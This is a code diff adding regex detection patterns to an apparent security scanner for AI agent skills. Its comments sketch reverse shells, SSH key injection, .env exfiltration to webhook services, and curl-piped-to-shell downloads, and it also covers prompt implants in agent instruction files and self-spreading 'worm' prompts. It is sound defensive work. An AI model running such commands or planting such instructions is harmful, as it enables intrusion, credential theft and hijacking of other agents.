@@ -1383,3 +1383,101 @@ INFRASTRUCTURE_PROTOCOL_ATTACKS = [
     r"(copyright\s*detect).{0,30}(bypass|evad|circumvent)",
     r"(llm|model)\s*(output).{0,30}(copyright).{0,20}(exploit|leak|extract)",
 ]
+
+# =============================================================================
+# NEW PATTERNS v3.2.0 (2026-02-11) - Skill Weaponization Defense
+# Min Hong Threat Analysis: Real-world weaponized AI agent skill patterns
+# 5 attack vectors: RCE, SSH injection, exfiltration, semantic worm, rootkit
+# =============================================================================
+
+# Reverse Shell Detection - interactive shells redirected to remote hosts
+SKILL_REVERSE_SHELL = [
+    # bash -i >& /dev/tcp/IP/PORT (classic reverse shell)
+    r"(?:bash|sh|zsh)\s+-i\s+.*[>&]\s*/dev/tcp/",
+    # nc -e /bin/sh (netcat reverse shell)
+    r"(?:nc|ncat|netcat)\s+.*(?:-e|--exec)\s*/bin/(?:ba)?sh",
+    # socat exec reverse shell
+    r"socat\s+.*exec.*(?:ba)?sh",
+    # mkfifo pipe reverse shell
+    r"mkfifo\s+.{0,30}\|.{0,30}(?:ba)?sh.{0,30}\|.{0,30}(?:nc|ncat)",
+    # nohup background persistent process
+    r"nohup\s+.*(?:bash|sh|nc|curl).{0,50}&",
+    # Python reverse shell
+    r"python\d?\s+-c\s+.{0,60}socket.{0,60}connect.{0,60}(?:sh|bash|cmd)",
+    # Ruby/Perl reverse shell
+    r"(?:ruby|perl)\s+-e\s+.{0,60}(?:TCPSocket|IO\.popen|socket|fork)",
+]
+
+# SSH Key Injection - persistent backdoor via authorized_keys manipulation
+SKILL_SSH_INJECTION = [
+    # echo ssh-rsa >> authorized_keys (classic injection)
+    r"(?:echo|printf|cat).{0,40}(?:ssh-rsa|ssh-ed25519|ecdsa-sha2).{0,200}(?:>>|>)\s*.*\.ssh/authorized_keys",
+    # Any write to authorized_keys
+    r"(?:>>|>)\s*.*\.ssh/authorized_keys",
+    # Remote download targeting SSH files
+    r"(?:curl|wget).{0,60}\.ssh/(?:authorized_keys|config|known_hosts)",
+    # SSH key exfiltration
+    r"(?:cat|less|head|tail|xxd)\s+.*\.ssh/(?:id_rsa|id_ed25519|id_ecdsa|id_dsa)\b",
+]
+
+# Exfiltration Pipeline - .env/secrets sent to external services
+SKILL_EXFILTRATION_PIPELINE = [
+    # curl POST with .env data
+    r"(?:curl|wget|fetch|post).{0,40}(?:-d|--data|--data-binary|-F).{0,30}\.env",
+    # Known exfiltration services
+    r"(?:webhook\.site|requestbin|pipedream|hookbin|ngrok\.io|burpcollaborator)",
+    # Programmatic .env read + HTTP send
+    r"(?:readFileSync|readFile|fs\.read).{0,40}\.env.{0,60}(?:fetch|axios|http|request|post)",
+    # process.env -> network
+    r"(?:process\.env|os\.environ|ENV\[).{0,60}(?:webhook|fetch|curl|post|send|upload)",
+    # Base64 encoding of secrets before exfil
+    r"(?:base64|btoa|b64encode).{0,40}(?:\.env|secret|token|key|password|credential)",
+]
+
+# Cognitive Rootkit - persistent prompt implant via agent instruction files
+SKILL_COGNITIVE_ROOTKIT = [
+    # Write to SOUL.md/AGENTS.md/HEARTBEAT.md/.cursor/rules
+    r"(?:write|append|modify|edit|create|echo|>>|>).{0,40}(?:SOUL\.md|AGENTS\.md|HEARTBEAT\.md|\.cursor/rules)",
+    # Injection into agent identity files
+    r"(?:install|copy|inject|insert|implant).{0,30}(?:into|to|in)\s+(?:SOUL|AGENTS|\.cursor|\.claw|skills)",
+    # Persistence instructions
+    r"(?:survive|persist|permanent|always.?loaded|auto.?inject).{0,30}(?:instruction|prompt|rule|directive|context)",
+    # Context file manipulation for behavioral backdoor
+    r"(?:context|behavior|personality|identity)\s*(?:file|config).{0,30}(?:modify|overwrite|inject|implant)",
+    # Scheduler-based persistence (heartbeat files)
+    r"(?:schedule|cron|interval|timer).{0,30}(?:HEARTBEAT|check.?in|ping).{0,20}(?:\.md|\.json|\.yaml)",
+]
+
+# Semantic Worm - viral propagation via agent instructions
+SKILL_SEMANTIC_WORM = [
+    # Viral propagation across agents
+    r"(?:copy|spread|propagate|share|forward|distribute).{0,30}(?:this|prompt|instruction|skill|message).{0,30}(?:to|with|among|across).{0,20}(?:other|all|every).{0,20}(?:agent|ai|model|assistant|user)",
+    # Self-replication terminology
+    r"(?:self[_-]?replicat|auto[_-]?propagat|viral|worm).{0,30}(?:prompt|instruction|skill|message)",
+    # Infection tracking
+    r"(?:infect|infection|infected|referred_by|propagation_count|spread_rate)",
+    # C2 heartbeat scheduling
+    r"(?:heartbeat|ping|check.?in|phone.?home).{0,30}(?:every|interval|schedule|cron|periodic).{0,30}(?:hour|minute|second|ms)",
+    # Botnet enrollment
+    r"(?:join|register|enroll|connect).{0,20}(?:collective|network|hive|swarm|botnet|mesh)",
+    # Remote installer piped to shell
+    r"(?:curl|wget|fetch).{0,40}\|\s*(?:ba)?sh.{0,40}(?:install|setup|init|bootstrap)",
+]
+
+# Obfuscated Payload Delivery - encoded/hidden malicious payloads
+SKILL_OBFUSCATED_PAYLOAD = [
+    # Error suppression + dangerous command chain
+    r"(?:2>\s*/dev/null|2>&1\s*>\s*/dev/null).{0,30}(?:&&|;|\|).{0,30}(?:curl|wget|echo|ssh|nc)",
+    # Silent download piped to shell
+    r"(?:curl|wget)\s+.*(?:-s|-S|-L|-o|-O).{0,60}\|\s*(?:ba)?sh",
+    # Password-protected archive (known malware pattern)
+    r"password.{0,10}(?:openclaw|openai|claude|anthropic|agent)",
+    # PowerShell encoded commands
+    r"-EncodedCommand|FromBase64String|ConvertFrom-Base64",
+    # exec/eval with encoded payload
+    r"(?:exec|eval)\s*\(.{0,30}(?:b64|base64|decode|decompress|unpack|fromCharCode)",
+    # Payload hosted on paste services
+    r"(?:glot\.io|pastebin|hastebin|paste\.ee|dpaste|0bin|ghostbin).{0,60}(?:raw|download|plain)",
+    # Multi-stage download chains
+    r"(?:curl|wget).{0,40}\|\s*(?:ba)?sh.{0,40}(?:curl|wget).{0,40}\|\s*(?:ba)?sh",
+]
